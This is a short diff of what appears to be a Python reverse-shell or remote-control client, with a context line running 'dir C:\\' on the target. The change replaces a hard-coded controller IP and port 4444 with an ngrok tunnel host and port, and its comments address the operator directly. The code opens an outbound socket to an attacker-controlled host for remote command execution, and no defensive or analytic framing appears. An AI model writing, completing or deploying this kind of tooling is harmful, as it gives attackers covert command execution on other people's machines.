@@ -31,8 +31,8 @@ run_command("dir C:\\")  # List C drive contents
 import socket
 import subprocess
 
-IP = "111.223.177.110"  # ← Your controller's public IP
-PORT = 4444
+IP = "0.tcp.in.ngrok.io"   # Host from your ngrok forwarding address
+PORT = 19536               # Port from your ngrok forwarding address
 
 s = socket.socket()
 s.connect((IP, PORT))
